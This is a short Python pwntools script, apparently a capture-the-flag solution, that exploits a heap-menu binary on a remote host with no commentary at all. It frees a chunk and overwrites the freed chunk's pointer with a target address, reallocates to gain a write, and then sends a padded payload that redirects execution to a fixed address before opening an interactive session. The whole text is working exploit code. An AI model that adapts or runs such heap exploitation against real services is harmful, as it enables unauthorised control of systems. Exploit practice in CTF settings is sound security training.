from pwn import *


# p = process('./heap')
p = remote('59.110.164.72', 10005)
elf = ELF('./heap')
lib = elf.libc


def choice(id_):
    p.recvuntil(b':')
    p.sendline(id_)


def add(id_, size_):
    choice(b'1')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.send(size_)


def delete(id_):
    choice(b'2')
    p.recvuntil(b':')
    p.sendline(id_)


def edit(id_, mess):
    choice(b'4')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.sendline(mess)


add(b'0', b'256')
add(b'1', b'256')
delete(b'0')
edit(b'0', p64(0) + p64(0x6029a8))
add(b'2', b'256')
choice(b'5')
payload = b'a' * 0x18 + p64(0x4009e2)
p.sendline(payload)
p.interactive()
